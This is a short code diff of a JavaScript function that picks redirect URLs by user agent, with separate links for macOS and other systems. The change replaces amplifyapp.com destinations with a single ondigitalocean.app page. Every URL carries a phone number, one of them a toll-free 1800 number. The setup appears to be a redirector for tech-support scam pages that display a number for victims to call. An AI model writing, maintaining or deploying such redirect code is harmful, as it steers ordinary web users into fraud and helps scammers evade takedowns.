@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://main.d3o0q87efdh1wv.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=0101-83366-64655",
-            others: "https://main.d3o0q87efdh1wv.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=0101-83366-64655"
+            macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
+            others: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://main.dmd46rtsqesma.amplifyapp.com/m2a4c234rjnkeferf/index.html?Anph=(050)-6864-8350",
-            others: "https://main.dmd46rtsqesma.amplifyapp.com/w2i4n234rjnkeferf/index.html?Anph=(050)-6864-8350"
+            macos: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905",
+            others: "https://plankton-app-s2yd4.ondigitalocean.app/merrx01usahtml/?bcda=1800%20033%20905"
         }
     ];
 
